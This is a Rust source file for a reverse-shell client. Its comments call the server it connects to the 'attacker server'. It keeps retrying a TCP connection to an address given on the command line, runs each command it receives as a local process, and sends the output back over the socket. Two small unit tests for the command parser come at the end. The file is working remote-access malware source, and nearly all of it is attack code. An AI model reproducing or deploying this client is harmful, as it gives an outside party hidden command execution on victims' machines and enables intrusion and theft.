use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
};

use clap::Parser;

use std::process::Command;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long)]
    addr: String,
}

/**
 *  connect to the attacker server
 *  
 *  make the connection with the attacker server, if the client cannot connect to that, try to establish another connection again
 *
 *  */
async fn connect(addr: String) -> TcpStream {
    loop {
        match TcpStream::connect(addr.clone()).await {
            Ok(socket) => {
                println!("[MESSAGE] => Connection established successfuly");
                return socket;
            }
            Err(_) => {
                println!("trying to estbalish the connetion with [{}]", addr);
            }
        };
    }
}

/**
 * parse the command to separate into the main command and its arguments
 * return a tuple with the command and its args
 *
 * parameter => &str
 * return => (&str, Vec<&str>)
 *
 */
fn command_parser(command: &str) -> (&str, Vec<&str>) {
    let mut args_vect: Vec<&str> = Vec::new();

    let command_splited: Vec<&str> = command.split(" ").collect();

    args_vect.extend(command_splited[1..].to_vec());

    (&command_splited.get(0).unwrap(), args_vect)
}


/**
 * handler of order, in this funcction recive the socket to read the command that the server return to it,
 * the proccess the request to finally executing the command and return the output to the server
 * 
 */

async fn handler_order(mut socket: TcpStream) {
    // buffer to storage the data
    let mut buffer_command = [0u8; 1024];

    loop {
        // get the command from attacker
        let n = match socket.read(&mut buffer_command).await {
            Ok(n) => n,
            Err(e) => {
                eprintln!("{:?}", e);
                socket
                    .write_all(b"Error after command process")
                    .await
                    .unwrap();
                return;
            }
        };

        let command_data = String::from_utf8_lossy(&buffer_command[..n]);


        // parsing the command into the main command and its arguments
        let (command, args) = command_parser(&command_data);

        println!("{}", command.trim());
        // executing the command
        let output_command = Command::new(command.trim())
            .args(args)
            .output()
            .expect("error ocurred in command process");

        /*
         * if the command returns an error,
         * that error is notificated to the server
         * else the command status is successfuly return the
         * output command to the server
         */
        if !output_command.status.success() {
            println!("{:?}", &output_command.status);

            let message_error = format!(
                "error ocurred in command process \n[STATUS] => {} \n[ERROR_MESSAGE] => {}",
                &output_command.status,
                String::from_utf8_lossy(&output_command.stderr)
            );

            socket.write_all(message_error.as_bytes()).await.unwrap();
            continue;
        }

        // send the outpu from the command to server attacker
        socket
            .write_all(String::from_utf8_lossy(&output_command.stdout).as_bytes())
            .await
            .unwrap();
    }
}

/**
 * 
 * main funcction of the program
 * 
 */

#[tokio::main]
async fn main() {
    // parsing the arguments
    let args = Args::parse();

    // connection to attacker server
    let socket = connect(args.addr).await;

    handler_order(socket).await;
}

// testing
#[test]
fn test_command_parser() {
    let command_string = "let -a -b -c";

    let (command, args) = command_parser(command_string);

    assert_eq!(command, "let");
    assert_eq!(args, vec!["-a", "-b", "-c"]);
}

#[test]
fn test_command() {
    let command_data = "echo hola_buenas";

    let (command, args) = command_parser(&command_data);

    println!("{}", command.trim());
    // executing the command
    let output_command = Command::new(command.trim())
        .args(args)
        .output()
        .expect("error ocurred in command process");

    assert_eq!(
        String::from_utf8_lossy(&output_command.stdout),
        "hola_buenas\n"
    );
}
